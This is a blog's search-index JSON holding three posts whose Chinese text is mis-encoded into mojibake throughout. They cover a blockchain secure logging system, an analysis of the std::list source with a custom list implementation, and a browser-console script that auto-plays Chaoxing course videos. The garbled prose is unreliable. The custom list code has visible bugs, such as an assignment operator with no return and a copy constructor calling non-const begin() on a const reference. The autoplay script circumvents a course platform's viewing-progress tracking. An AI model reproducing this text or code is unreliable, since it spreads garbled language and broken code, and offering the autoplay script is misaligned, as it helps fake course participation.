åœ¨ç³»ç»Ÿéƒ¨ç½²æ—¶ï¼ŒåŒºå—é“¾CAä¼šå¯¹æ—¥å¿—æ”¶é›†æ¨¡å—ï¼ŒåŒºå—é“¾å„èŠ‚ç‚¹å’Œgrafanaæ’ä»¶å‘æ”¾è¯ä¹¦ï¼Œä¹‹åå‘é€æ—¥å¿—è¯·æ±‚æ—¶ï¼Œæ•°æ®åœ¨åˆ†å¸ƒå¼ç³»ç»Ÿçš„èŠ‚ç‚¹é—´ä¼ æ’­ä¹‹å‰ï¼Œå‡åœ¨æœ¬èŠ‚ç‚¹å¯¹æ•°æ®è¿›è¡Œä¸€æ¬¡æ‘˜è¦å¤„ç†ï¼ˆHashï¼‰ï¼Œå¹¶ä½¿ç”¨èŠ‚ç‚¹ç§é’¥å¯¹æ‘˜è¦å®æ–½éå¯¹ç§°åŠ å¯†ï¼ˆç­¾åï¼‰ï¼Œä¹‹åå°†æ•°æ®ä¸ç­¾åæ‰“åŒ…æˆæ¶ˆæ¯ä¼ è¾“ç»™ç›®æ ‡èŠ‚ç‚¹ã€‚åœ¨ç›®æ ‡èŠ‚ç‚¹å¤„å¯¹ä¼ è¾“æ•°æ®å†å®æ–½ä¸€æ¬¡æ‘˜è¦å¤„ç†ï¼ˆHashï¼‰ï¼Œå¹¶ç”¨åŸå§‹èŠ‚ç‚¹çš„å…¬é’¥è§£å¯†ç­¾ååï¼Œå°†è§£å¯†ç»“æœä¸æ‘˜è¦å¯¹æ¯”ï¼ŒéªŒè¯ä¸€è‡´æ–¹è®¤ä¸ºæ¶ˆæ¯å†…å®¹æ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ä»è€Œå¯ä»¥é˜²æ­¢éæ³•ç”¨æˆ·å¯¹åŒºå—é“¾è°ƒç”¨chaincodeï¼Œé€ æˆç ´åã€‚åŒæ—¶å¯¹ä¸æ­£å¸¸è¯·æ±‚å¯æ ¹æ®ç­¾åè¿½æº¯æ—¥å¿—å‘é€è€…ï¼Œæ–¹ä¾¿æ—¥åå–è¯ã€‚ é˜²æ­¢é‡å¤deleteæ”»å‡» æœ¬ç³»ç»Ÿæ–°è®¾ç½®äº†delete chaincodeæ–¹æ³•ç”¨äºå®šæœŸæˆªæ–­åŒºå—é“¾ï¼Œåˆ é™¤è®¾å®šæ—¶é—´ä¹‹å‰çš„åŒºå—ã€‚å¦‚æœé»‘å®¢æˆåŠŸé€šè¿‡ç­¾åéªŒè¯ï¼Œä¸ºé˜²æ­¢è¯¥chaincodeè¢«é»‘å®¢åˆ©ç”¨å»åˆ é™¤å…¶ä»–åŒºå—ï¼Œæˆ‘ä»¬å°†è®¾å®šæ—¶é—´è®¾ä¸ºconstå˜é‡ï¼Œå†™æ­»åœ¨chaincodeä¸­ï¼Œä¸€æ—¦éƒ¨ç½²chaincodeå°±ä¸èƒ½æ›´æ”¹ï¼Œä½¿å¾—é»‘å®¢å³ä½¿é‡å¤è°ƒç”¨delete chaincodeä¹Ÿä¸èƒ½åˆ é™¤è®¾å®šæ—¶é—´å†…çš„åŒºå—ï¼›åŒæ—¶ï¼Œchaincodeç”±goè¯­è¨€ç¼–å†™ï¼Œåˆ©ç”¨goè¯­è¨€çš„å®‰å…¨æ€§è´¨ï¼Œå¾ˆéš¾å‡ºç°ç¼“å†²åŒºæº¢å‡ºç­‰æ¼æ´å»ç¯¡æ”¹æ—¶é—´å˜é‡ã€‚ æ—¥å¿—å¤šå‰¯æœ¬å­˜å‚¨å®ç°ç¾å¤‡ ç”¨åŒºå—é“¾å¤šèŠ‚ç‚¹å…±è¯†å­˜å‚¨çš„ç‰¹æ€§ï¼Œä½¿æ—¥å¿—å®ç°å¤šå‰¯æœ¬å­˜å‚¨ï¼Œå¤§å¤§å‡å°äº†å› ç¡¬ç›˜æŸåç­‰é—®é¢˜å¯¼è‡´æ—¥å¿—ä¸¢å¤±çš„å¯èƒ½æ€§ã€‚ æ€»ç»“äº‘å­˜å‚¨æŠ€æœ¯çš„å‘å±•è®©äººä»¬çœ‹åˆ°äº†ä¸‹ä¸€ä»£äº’è”ç½‘æŠ€æœ¯çš„å‘å±•æ–¹å‘ï¼Œä½†åŒæ—¶æ•°æ®æ³„éœ²ã€æ•°æ®ç¯¡æ”¹ç­‰é—®é¢˜é™åˆ¶äº†äº‘å­˜å‚¨æŠ€æœ¯çš„è¿›ä¸€æ­¥å‘å±•ã€‚ åŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿä¸ºæ•°æ®å®‰å…¨æä¾›äº†å¾ˆå¥½çš„ä¿éšœï¼Œè¯¥æ—¥å¿—ç³»ç»Ÿé€šè¿‡ç»“åˆåŒºå—é“¾æŠ€æœ¯ï¼Œè®¾è®¡é“¾ä¸Šæ•°æ®å­˜å‚¨æ¨¡å¼ï¼Œæœ‰æ•ˆåœ°è§£å†³äº†æ—¥å¿—æ–‡ä»¶æ˜“è¢«ç¯¡æ”¹ã€æ•°æ®æ³„éœ²ç­‰é—®é¢˜ï¼ŒåŒæ—¶æä¾›äº†å¯è§†åŒ–ç•Œé¢è®©ç”¨æˆ·èƒ½å¤Ÿä½¿ç”¨æ—¥å¿—ç›¸å…³çš„å®‰å…¨åˆ†æåŠŸèƒ½ã€‚ éšç€æ™ºèƒ½æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼Œæ—¥å¿—åˆ†æä¹Ÿåº”ç´§è·Ÿæ½®æµï¼Œç§¯æå¼•å…¥å…ˆè¿›çš„æŠ€æœ¯ï¼ŒåŒæ—¶æ”»å‡»æ‰‹æ®µå’Œæ–¹æ³•ä¹Ÿåœ¨ä¸åœçš„å˜åŒ–å’Œå®Œå–„ï¼Œå› æ­¤éœ€è¦å¤šåŠ æ³¨æ„è¿™äº›å˜åŒ–ï¼ŒåŠæ—¶æ›´æ–°æ—¥å¿—åˆ†æçš„æ–¹æ³•ï¼Œé¿å…è¯¯åˆ¤æ¼åˆ¤çš„æƒ…å†µã€‚ç›®å‰æœ¬é¡¹ç›®ä¹Ÿå­˜åœ¨ä¸€äº›é—®é¢˜ï¼š åˆ©ç”¨åŒºå—é“¾å­˜å‚¨æ—¥å¿—è®°å½•ï¼Œå½“æ—¥å¿—å˜å¾—å¾ˆå¤šçš„æ—¶å€™ï¼Œç”±äºæ‰€æœ‰çš„èŠ‚ç‚¹éƒ½éœ€è¦ä¿å­˜æœ‰æ•´ä¸ªç³»ç»Ÿå‰¯æœ¬ï¼Œå› æ­¤ä¼šå¸¦æ¥è¾ƒå¤§çš„å­˜å‚¨å¼€é”€ã€‚ä¹‹åæˆ‘ä»¬å°†è¿›ä¸€æ­¥ç ”ç©¶åˆ©ç”¨åŒºå—é“¾çš„äº¤å‰çº§è”ç‰¹æ€§ï¼Œå°½å¯èƒ½çš„å‡å°‘å†—ä½™ï¼› æ—¥å¿—æ”¶é›†çš„ä»»åŠ¡éƒ¨ç½²å°šæœªå®ç°UIï¼Œç›®å‰åªèƒ½æ‰‹å‘httpè¯·æ±‚å»éƒ¨ç½²æ”¶é›†ä»»åŠ¡ï¼› å¯è§†åŒ–ç•Œé¢éœ€è¦è¿›ä¸€æ­¥ä¼˜åŒ–ï¼Œä¹‹åæˆ‘ä»¬ä¼šä¸°å¯Œæ—¥å¿—åˆ†æåŠŸèƒ½ï¼ŒåŒæ—¶è®¾è®¡ç•Œé¢å¸ƒå±€ï¼Œè¾¾åˆ°ç¾è§‚å¤§æ–¹ç®€æ´çš„æ•ˆæœï¼› ç›®å‰çš„å·¥ä½œåªæ˜¯ç®€å•åœ°å®ç°äº†ä¸€ä¸ªåŸºäºåŒºå—é“¾çš„å®‰å…¨æ—¥å¿—ç³»ç»Ÿï¼Œæ¥ä¸‹æ¥è¿˜éœ€è¦å¯¹ç³»ç»Ÿçš„æé€Ÿï¼Œæé«˜å­˜å‚¨ç©ºé—´åˆ©ç”¨ç‡è¿›è¡Œæ›´æ·±ä¸€æ­¥ç ”ç©¶ï¼ŒåŒæ—¶å¯¹äºåŒºå—é“¾åœ¨å…¶ä»–åœºæ™¯é‡Œçš„åº”ç”¨ä¹Ÿå¯ä»¥åšè¿›ä¸€æ­¥çš„æ¢ç´¢ã€‚ å‚è€ƒæ–‡çŒ®[1] è´¹ç¦¹ï¼Œå®é™ï¼Œèƒ¡é’.åŸºäºåŒºå—é“¾çš„æ—¥å¿—å­˜å‚¨ç³»ç»Ÿ [J] .ç½‘ç»œç©ºé—´å®‰å…¨ï¼Œ2018, Vol. 9(6): 80-85. [2] éŸ©èŠèŒ¹ï¼Œçºªå…†è½©ï¼Œæä¸€é¸£.åŸºäºåŒºå—é“¾çš„å¯ä¿¡æ—¥å¿—å­˜å‚¨ä¸éªŒè¯ç³»ç»Ÿ [J] .è®¡ç®—æœºå·¥ç¨‹ï¼Œ2019, Vol. 45(5): 13-17. [3] å¾æ²»ç†ï¼Œå°åŒ–æ°‘ï¼Œåˆ˜é£™.ä¸€ç§åŸºäºä¿¡ç”¨çš„æ”¹è¿›PBFTé«˜æ•ˆå…±è¯†æœºåˆ¶[J/OL].2019,36(10).[2018-06-09] [4] åˆ˜å¿†å®, å‘¨å…ƒå¥, è“å¦‚å¸ˆ,ç­‰. åŸºäºåŒºå—é“¾çš„äº‘æ•°æ®åˆ é™¤éªŒè¯åè®®[J]. è®¡ç®—æœºç ”ç©¶ä¸å‘å±•, 2018, 55(10):107-115.","categories":[],"tags":[{"name":"åŒºå—é“¾","slug":"åŒºå—é“¾","permalink":"https://mundi-xu.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"äº‘å­˜å‚¨","slug":"äº‘å­˜å‚¨","permalink":"https://mundi-xu.github.io/tags/%E4%BA%91%E5%AD%98%E5%82%A8/"},{"name":"æ—¥å¿—ç³»ç»Ÿ","slug":"æ—¥å¿—ç³»ç»Ÿ","permalink":"https://mundi-xu.github.io/tags/%E6%97%A5%E5%BF%97%E7%B3%BB%E7%BB%9F/"},{"name":"æ™ºèƒ½åˆçº¦","slug":"æ™ºèƒ½åˆçº¦","permalink":"https://mundi-xu.github.io/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"},{"name":"Fabric v0.6","slug":"Fabric-v0-6","permalink":"https://mundi-xu.github.io/tags/Fabric-v0-6/"}]},{"title":"stl-listå®ç°åˆ†æ","slug":"stl-listå®ç°","date":"2019-10-31T18:14:00.000Z","updated":"2020-12-23T15:54:13.113Z","comments":true,"path":"2019/11/01/stl-listå®ç°/","link":"","permalink":"https://mundi-xu.github.io/2019/11/01/stl-list%E5%AE%9E%E7%8E%B0/","excerpt":"stl_list ä»‹ç»ä¸æºç åˆ†æ","text":"stl_list ä»‹ç»ä»Šå¤©æˆ‘ä»¬æ¥æ€»ç»“ä¸€ä¸‹stl_List, ä¸å•é“¾è¡¨æ¯”è¾ƒè€Œè¨€ï¼Œstl_listæ— éå°±æ˜¯é“¾è¡¨ç»“æ„ä¸ä¸€æ ·ï¼Œè‡³äºå…¶ä¸­çš„å¢åˆ æ”¹æŸ¥çš„ç»†èŠ‚å®ç°æœ¬è´¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å¤„ç†æŒ‡é’ˆåç§»ã€‚ç›¸æ¯”äºvectorï¼Œstl_Liståœ¨æ’å…¥å’Œåˆ é™¤çš„æ—¶å€™å¯ä»¥è¾¾åˆ°O(1)çš„æ—¶é—´å¤æ‚åº¦ã€‚ stl_listæ˜¯ä¸€ä¸ªåŒå‘å¾ªç¯é“¾è¡¨ï¼Œç›¸å¯¹å•é“¾è¡¨æ¥è¯´æŸ¥æ‰¾æ•ˆç‡é«˜ï¼Œæ— è®ºæ˜¯æ’å…¥æ—¶çš„å‰æ’å’Œåæ’ï¼Œè¿˜æ˜¯ä»åå¾€å‰æŸ¥æ‰¾æŸä¸ªå…ƒç´ ç­‰ã€‚æ—¢ç„¶æŸ¥æ‰¾æ•ˆç‡é«˜äº†ï¼Œè‡ªç„¶æ·»åŠ ï¼Œåˆ é™¤å’Œä¿®æ”¹å…ƒç´ æ—¶æ•ˆç‡ä¹Ÿå°±æ›´é«˜ã€‚å”¯ä¸€ä¸€ä¸ªå¯ä»¥ç§°ä¸ºä¸è¶³çš„å°±æ˜¯æ¯ä¸ªèŠ‚ç‚¹éœ€è¦è€—è´¹4å­—èŠ‚æŒ‡é’ˆæ¥ä¿å­˜å‰ä¸€ä¸ªèŠ‚ç‚¹çš„åœ°å€ï¼Œå› æ­¤å¦‚æœé‡åˆ°å¯¹å†…å­˜è¦æ±‚æ¯”è¾ƒè‹›åˆ»çš„åœºæ™¯ï¼Œè€Œä¸”ä¸€äº›æ“ä½œå•é“¾è¡¨å³å¯æ»¡è¶³ï¼Œé‚£ä¹ˆå¯ä»¥è€ƒè™‘ä½¿ç”¨æ ‡å‡†åº“ä¸­çš„forward_listï¼ˆå•é“¾è¡¨ï¼‰ã€‚ stl_list æºç åˆ†æåˆ†ægnu c++æ ‡å‡†åº“ä¸­çš„stl_listï¼Œæˆ‘ä»¬åªéœ€æŠŠæ¡ä½æ•´ä½“ç»“æ„å³å¯ï¼Œå®ç°æ€»å…±ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼Œé“¾è¡¨èŠ‚ç‚¹(struct _List_node : public __detail::_List_node_base) ï¼Œè¿­ä»£å™¨ï¼ˆstruct _List_iteratorï¼‰ï¼Œé“¾è¡¨æ•°æ®ç»“æ„ï¼ˆclass list : protected _List_base&lt;_Tp, _Alloc&gt;ï¼‰ã€‚ gnuä¸‹æœ€æ–°ç‰ˆæœ¬çš„stl_listå®ç°åŠ äº†ä¸€äº›é¢å¤–çš„ç»§æ‰¿å…³ç³»ï¼Œ_list_baseä¸­ä¿å­˜äº†ä¸€ä¸ª_List_impl _M_implä¸­é—´å˜é‡ï¼Œç”±è¯¥ç±»_M_implæ¥ä¿å­˜èŠ‚ç‚¹ï¼Œå¹¶å¯¹èŠ‚ç‚¹åšåŸºæœ¬å¤„ç†ã€‚ é“¾è¡¨èŠ‚ç‚¹çˆ¶ç±»ç»´æŠ¤ä¸¤ä¸ªæŒ‡é’ˆï¼Œå­ç±»æ‰åŠ å…¥å…·ä½“çš„valueã€‚ 1234567891011121314struct _List_node_base&#123; _List_node_base* _M_next; _List_node_base* _M_prev;&#125;; template&lt;typename _Tp&gt;struct _List_node : public __detail::_List_node_base&#123; ///&lt; User&#x27;s data. _Tp _M_data;&#125;; è¿­ä»£å™¨ä¸»è¦æ˜¯å®ç°++å’Œâ€“ç­‰æ“ä½œç¬¦é‡è½½ï¼Œå®ç°é“¾è¡¨èŠ‚ç‚¹çš„å‰åç§»åŠ¨ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273template&lt;typename _Tp&gt; struct _List_iterator &#123; typedef _List_iterator&lt;_Tp&gt; _Self; typedef _List_node&lt;_Tp&gt; _Node; typedef ptrdiff_t difference_type; typedef std::bidirectional_iterator_tag iterator_category; typedef _Tp value_type; typedef _Tp* pointer; typedef _Tp&amp; reference; _List_iterator() _GLIBCXX_NOEXCEPT : _M_node() &#123; &#125; explicit _List_iterator(__detail::_List_node_base* __x) _GLIBCXX_NOEXCEPT : _M_node(__x) &#123; &#125; _Self _M_const_cast() const _GLIBCXX_NOEXCEPT &#123; return *this; &#125; // Must downcast from _List_node_base to _List_node to get to _M_data. reference operator*() const _GLIBCXX_NOEXCEPT &#123; return static_cast&lt;_Node*&gt;(_M_node)-&gt;_M_data; &#125; pointer operator-&gt;() const _GLIBCXX_NOEXCEPT &#123; return std::__addressof(static_cast&lt;_Node*&gt;(_M_node)-&gt;_M_data); &#125; _Self&amp; operator++() _GLIBCXX_NOEXCEPT &#123; _M_node = _M_node-&gt;_M_next; //æœ¬è´¨æ˜¯é“¾è¡¨èŠ‚ç‚¹çš„nextæŒ‡é’ˆæ“ä½œ return *this; &#125; _Self operator++(int) _GLIBCXX_NOEXCEPT &#123; _Self __tmp = *this; _M_node = _M_node-&gt;_M_next; return __tmp; &#125; _Self&amp; operator--() _GLIBCXX_NOEXCEPT &#123; _M_node = _M_node-&gt;_M_prev; //æœ¬è´¨æ˜¯é“¾è¡¨èŠ‚ç‚¹çš„prevæŒ‡é’ˆæ“ä½œ return *this; &#125; _Self operator--(int) _GLIBCXX_NOEXCEPT &#123; _Self __tmp = *this; _M_node = _M_node-&gt;_M_prev; return __tmp; &#125; bool operator==(const _Self&amp; __x) const _GLIBCXX_NOEXCEPT &#123; return _M_node == __x._M_node; &#125; bool operator!=(const _Self&amp; __x) const _GLIBCXX_NOEXCEPT &#123; return _M_node != __x._M_node; &#125; // The only member points to the %list element. __detail::_List_node_base* _M_node; //ç»´æŠ¤ä¸€ä¸ªé“¾è¡¨èŠ‚ç‚¹ &#125;; é“¾è¡¨æ•°æ®ç»“æ„å®ç°ç±» _List_implï¼Œä¸»è¦ç”¨æ¥ç»´æŠ¤é“¾è¡¨èŠ‚ç‚¹ï¼Œç„¶ålistç±»åŒ…å«è¯¥ç±»ã€‚ 1234567891011121314151617181920struct _List_impl : public _Node_alloc_type &#123; __detail::_List_node_base _M_node; //å…¶å®å°±æ˜¯ç»´æŠ¤èŠ‚ç‚¹ï¼Œæ ‡å‡†åº“ä¸­ç”¨äº†ä¸€ä¸ªä¸­é—´å±‚æ¥å¤„ç† _List_impl() : _Node_alloc_type(), _M_node() &#123; &#125; _List_impl(const _Node_alloc_type&amp; __a) _GLIBCXX_NOEXCEPT : _Node_alloc_type(__a), _M_node() &#123; &#125;#if __cplusplus &gt;= 201103L _List_impl(_Node_alloc_type&amp;&amp; __a) _GLIBCXX_NOEXCEPT : _Node_alloc_type(std::move(__a)), _M_node() &#123; &#125;#endif &#125;; _List_baseç±» 12345678910111213141516171819202122232425262728293031323334353637383940414243444546template&lt;typename _Tp, typename _Alloc&gt; class _List_base &#123; protected: typedef typename _Alloc::template rebind&lt;_List_node&lt;_Tp&gt; &gt;::other _Node_alloc_type; typedef typename _Alloc::template rebind&lt;_Tp&gt;::other _Tp_alloc_type; static size_t _S_distance(const __detail::_List_node_base* __first, const __detail::_List_node_base* __last) &#123; size_t __n = 0; while (__first != __last) &#123; __first = __first-&gt;_M_next; ++__n; &#125; return __n; &#125; _List_impl _M_impl; // ä¸­é—´å±‚ç±» // count the number of nodes size_t _M_node_count() const &#123; return _S_distance(_M_impl._M_node._M_next, std::__addressof(_M_impl._M_node)); &#125; public: typedef _Alloc allocator_type; void _M_clear() _GLIBCXX_NOEXCEPT; void _M_init() _GLIBCXX_NOEXCEPT &#123; this-&gt;_M_impl._M_node._M_next = &amp;this-&gt;_M_impl._M_node; this-&gt;_M_impl._M_node._M_prev = &amp;this-&gt;_M_impl._M_node; _M_set_size(0); &#125; &#125;; listç±» 12345678910111213141516171819202122232425262728293031323334353637383940template&lt;typename _Tp, typename _Alloc = std::allocator&lt;_Tp&gt; &gt; class list : protected _List_base&lt;_Tp, _Alloc&gt; &#123; // concept requirements typedef typename _Alloc::value_type _Alloc_value_type; __glibcxx_class_requires(_Tp, _SGIAssignableConcept) __glibcxx_class_requires2(_Tp, _Alloc_value_type, _SameTypeConcept) typedef _List_base&lt;_Tp, _Alloc&gt; _Base; typedef typename _Base::_Tp_alloc_type _Tp_alloc_type; typedef typename _Base::_Node_alloc_type _Node_alloc_type; public: typedef _Tp value_type; typedef typename _Tp_alloc_type::pointer pointer; typedef typename _Tp_alloc_type::const_pointer const_pointer; typedef typename _Tp_alloc_type::reference reference; typedef typename _Tp_alloc_type::const_reference const_reference; typedef _List_iterator&lt;_Tp&gt; iterator; typedef _List_const_iterator&lt;_Tp&gt; const_iterator; typedef std::reverse_iterator&lt;const_iterator&gt; const_reverse_iterator; typedef std::reverse_iterator&lt;iterator&gt; reverse_iterator; typedef size_t size_type; typedef ptrdiff_t difference_type; typedef _Alloc allocator_type; protected: // Note that pointers-to-_Node&#x27;s can be ctor-converted to // iterator types. typedef _List_node&lt;_Tp&gt; _Node; using _Base::_M_impl; using _Base::_M_put_node; using _Base::_M_get_node; using _Base::_M_get_Tp_allocator; using _Base::_M_get_Node_allocator; ..........................................................&#125; å¤§æ¦‚æˆªå–äº†stl_listå®ç°çš„ä¸€éƒ¨åˆ†ï¼Œä¸»è¦ä¸ºäº†ä½“ç°stl_listçš„ä»£ç ç»“æ„ï¼Œå…·ä½“æ¥å£å®ç°å¯ä»¥æŸ¥çœ‹æºç ã€‚ stl-listç®€å•å®ç°STL_List.h123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296#ifndef STL_LIST#define STL_LIST#include &quot;Def.h&quot;__MUNDI_BEGINtemplate &lt;typename T&gt; class list&#123;public: // The list node, the parent class maintains two pointers, and the subclass adds the specific value. struct list_node_base &#123; list_node_base* Next; list_node_base* Prev; list_node_base():Next(nullptr), Prev(nullptr)&#123;&#125; &#125;; // dataEntry node struct list_node: public list_node_base &#123; T dataEntry; &#125;; // iterator struct list_iterator &#123; typedef list_iterator _Self; typedef T value_type; typedef T* pointer; typedef T&amp; reference; list_iterator() _T_STD_NOEXCEPT &#123; m_smartPtr = nullptr; &#125; explicit list_iterator(list_node_base * pNode) _T_STD_NOEXCEPT &#123; m_smartPtr = pNode; &#125; reference operator*() _T_STD_NOEXCEPT &#123; return static_cast&lt;list_node *&gt;(m_smartPtr)-&gt;dataEntry; &#125; list_node_base* operator-&gt;() _T_STD_NOEXCEPT &#123; return m_smartPtr; &#125; _Self operator++(int) _T_STD_NOEXCEPT // post increment &#123; _Self __tmp = *this; m_smartPtr = m_smartPtr-&gt;Next; return __tmp; &#125; _Self&amp; operator++() _T_STD_NOEXCEPT // pre increment &#123; m_smartPtr = m_smartPtr-&gt;Next; return *this; &#125; _Self operator--(int) _T_STD_NOEXCEPT &#123; _Self __tmp = *this; m_smartPtr = m_smartPtr-&gt;Prev; return __tmp; &#125; _Self&amp; operator--() _T_STD_NOEXCEPT &#123; m_smartPtr = m_smartPtr-&gt;Prev; return *this; &#125; bool operator==(const list_iterator &amp; _Right) const _T_STD_NOEXCEPT &#123; return m_smartPtr == _Right.m_smartPtr; &#125; bool operator!=(const list_iterator &amp; _Right) const _T_STD_NOEXCEPT &#123; return m_smartPtr != _Right.m_smartPtr; &#125; list_node_base * m_smartPtr; // Node pointer &#125;;public: typedef list_iterator iterator;public: list() // Default constructor &#123; empty_init(); &#125; list(const list&lt;T&gt; &amp; rhs) // Copy construction &#123; if(this != &amp;rhs) &#123; empty_init(); // initialization iterator itrBegin = rhs.begin(); iterator itrEnd = rhs.end(); while(itrBegin != itrEnd) &#123; list_node * tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); push_back(tmp-&gt;dataEntry); ++itrBegin; &#125; &#125; &#125; list &amp; operator = (const list&lt;T&gt; &amp; rhs) // Assignment operator overloading &#123; if(this != &amp;rhs) &#123; // If the original list has a value, it will be emptied first. if(begin() != end()) &#123; clear(); &#125; iterator itrBegin = rhs.begin(); iterator itrEnd = rhs.end(); while(itrBegin != itrEnd) &#123; list_node * tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); push_back(tmp-&gt;dataEntry); ++itrBegin; &#125; &#125; &#125; ~list() // Destructor &#123; clear(); if(pHeadNode) &#123; delete pHeadNode; pHeadNode = nullptr; &#125; &#125; iterator begin() _T_STD_NOEXCEPT &#123; return iterator(pHeadNode-&gt;Next); &#125; iterator end() _T_STD_NOEXCEPT &#123; return iterator(pHeadNode); &#125; void push_back(const T &amp; value) &#123; insert(end(), value); &#125; void push_front(const T &amp; value) &#123; insert(begin(), value); &#125; void pop_front() &#123; erase(begin()); &#125; void pop_back() &#123; iterator tmp = end(); erase(--tmp); &#125; T &amp; front() &#123; return *begin(); &#125; T &amp; back() &#123; return *(--end()); &#125; unsigned int remove(const T &amp; value) &#123; unsigned int count = 0; iterator itrBegin = begin(); while(itrBegin != end()) &#123; if(*itrBegin == value) &#123; itrBegin = erase(itrBegin); ++count; &#125; else &#123; ++itrBegin; &#125; &#125; return count; &#125; iterator erase(iterator position) &#123; list_node_base* next_node = position.m_smartPtr-&gt;Next; list_node_base* prev_node = position.m_smartPtr-&gt;Prev; prev_node-&gt;Next = next_node; next_node-&gt;Prev = prev_node; delete position.m_smartPtr; position.m_smartPtr = nullptr; if(_size &gt; 0) &#123; _size--; &#125; return iterator(next_node); &#125; iterator insert(iterator position, const T&amp; x) &#123; list_node* tmp = new list_node(); tmp-&gt;dataEntry = x; tmp-&gt;Next = position.m_smartPtr; tmp-&gt;Prev = position.m_smartPtr-&gt;Prev; position.m_smartPtr-&gt;Prev-&gt;Next = tmp; position.m_smartPtr-&gt;Prev = tmp; ++_size; return iterator(tmp); &#125; void clear() &#123; iterator itrBegin = begin(); while(itrBegin != end()) &#123; list_node* tmp = static_cast&lt;list_node *&gt;(itrBegin.m_smartPtr); ++itrBegin; if(tmp) &#123; delete tmp; &#125; &#125; pHeadNode-&gt;Next = pHeadNode; pHeadNode-&gt;Prev = pHeadNode; _size = 0; &#125; int size() // return length &#123; return _size; &#125;private: void empty_init() &#123; pHeadNode = new list_node_base(); pHeadNode-&gt;Next = pHeadNode; // Initialize pointer to itself pHeadNode-&gt;Prev = pHeadNode; _size = 0; &#125;private: list_node_base* pHeadNode; // List head unsigned int _size; // the number of nodes, increase the efficiency of searching&#125;;__MUNDI_END#endif Def.h123456789101112131415#define __MUNDI_BEGIN namespace Mundi &#123;#define __MUNDI_END &#125;#ifndef _T_STD_NOEXCEPT# if __cplusplus &gt;= 201103L# define _T_STD_NOEXCEPT noexcept# define _T_STD_USE_NOEXCEPT noexcept# define _T_STD_THROW(_EXC)# else# define _T_STD_NOEXCEPT# define _T_STD_USE_NOEXCEPT throw()# define _T_STD_THROW(_EXC) throw(_EXC)# endif#endif","categories":[],"tags":[{"name":"C++","slug":"C","permalink":"https://mundi-xu.github.io/tags/C/"},{"name":"list","slug":"list","permalink":"https://mundi-xu.github.io/tags/list/"}]},{"title":"è¶…æ˜Ÿå­¦ä¹ é€šå¼€å¯è‡ªåŠ¨æ’­æ”¾æ¨¡å¼","slug":"å­¦ä¹ é€šè‡ªåŠ¨æ’­æ”¾æ¨¡å¼","date":"2019-08-21T03:11:00.000Z","updated":"2020-12-23T15:57:57.650Z","comments":true,"path":"2019/08/21/å­¦ä¹ é€šè‡ªåŠ¨æ’­æ”¾æ¨¡å¼/","link":"","permalink":"https://mundi-xu.github.io/2019/08/21/%E5%AD%A6%E4%B9%A0%E9%80%9A%E8%87%AA%E5%8A%A8%E6%92%AD%E6%94%BE%E6%A8%A1%E5%BC%8F/","excerpt":"ä¸ºä¾¿äºè§‚çœ‹è¶…æ˜Ÿå­¦ä¹ é€šè¯¾ç¨‹è§†é¢‘ï¼Œæé«˜å­¦ä¹ æ•ˆç‡ï¼Œç‰¹æ¨å‡ºè‡ªåŠ¨æ’­æ”¾æ¨¡å¼ï¼Œä»…ä¾›äº¤æµå­¦ä¹ ã€‚","text":"In three words I can sum up everything Iâ€™ve learned about life: it goes on.å‡ ä¸ªå­—è¶³ä»¥æ¦‚æ‹¬æˆ‘å­¦åˆ°çš„äººç”Ÿï¼šä¸€åˆ‡éƒ½åœ¨ç»§ç»­ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344var fa = $(&quot;body&quot;);var btn = $(&quot;&lt;li&gt;&lt;/li&gt;&quot;);var json = &#123; &quot;background&quot;: &quot;#66ccff&quot;, &quot;height&quot;: &quot;16px&quot;, &quot;padding&quot;: &quot;5px&quot;, &quot;z-index&quot;: 0xFFFFF, &quot;cursor&quot;: &quot;pointer&quot;, &quot;top&quot;: &quot;300px&quot;, &quot;right&quot;: &quot;120px&quot;, &quot;position&quot;: &quot;fixed&quot;&#125;;btn.css(json);btn.html(&quot;&lt;span id=&#x27;lfsenior&#x27;&gt;å¼€å¯è‡ªåŠ¨æ’­æ”¾æ¨¡å¼&lt;/span&gt;&quot;);fa.append(btn); btn.click(function () &#123; setInterval(function () &#123; //è·å–iframe var video = $(&quot;iframe&quot;).contents().find(&quot;iframe&quot;).contents(); //æ’­æ”¾å‡½æ•° var play = function () &#123; video.find(&quot;#video &gt; button&quot;).click(); var jy = video.find(&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-volume-panel.vjs-control.vjs-volume-panel-vertical &gt; button&quot;); if (jy.attr(&quot;title&quot;) != &quot;å–æ¶ˆé™éŸ³&quot;) &#123; jy.click() &#125; &#125; //å¦‚æœæ­£åœ¨åŠ è½½ var load = video.find(&quot;#loading&quot;); if (load.css(&quot;visibility&quot;) != &quot;hidden&quot;) &#123; return; &#125; //è·å–å½“å‰è¿›åº¦ var spans = video.find(&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-progress-control.vjs-control &gt; div&quot;).attr(&quot;aria-valuenow&quot;); // å¦‚æœè¿˜æ²¡æ’­æ”¾å®Œ if (spans != 100) &#123; play(); &#125; $(&quot;#lfsenior&quot;).html(&quot;è‡ªåŠ¨æ¨¡å¼å·²å¼€å¯,æœ¬ç« è¿›åº¦:&quot; + spans + &quot;%&quot;); &#125;, 100); &#125;); ä»¥Chromeä¸ºä¾‹ï¼ŒæŒ‰F12æ‰“å¼€Consoleï¼Œå¤åˆ¶ä»£ç å›è½¦å³å¯ã€‚ 